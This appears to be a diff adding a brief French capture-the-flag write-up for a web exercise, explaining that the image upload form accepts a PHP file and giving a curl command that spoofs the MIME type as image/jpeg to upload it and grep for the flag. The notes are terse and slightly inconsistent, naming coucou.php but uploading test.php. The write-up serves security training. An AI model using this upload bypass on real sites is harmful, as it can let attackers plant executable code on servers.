@@ -1,0 +1,4 @@
+Sur la page d'upload d'image, on voit que le formulaire peut etre change, on peut par exemple mettre un fichier.php
+Il suffit de creer un fichier php, par exemple "touch /tmp/coucou.php"
+Et ensuite faire un curls pour upload le fichier php et grep pouren ressortir le flag
+curl -s -X POST -F "uploaded=@/tmp/test.php;type=image/jpeg" -F "Upload=Upload" "http://$1/index.php?page=upload" | grep 'flag'
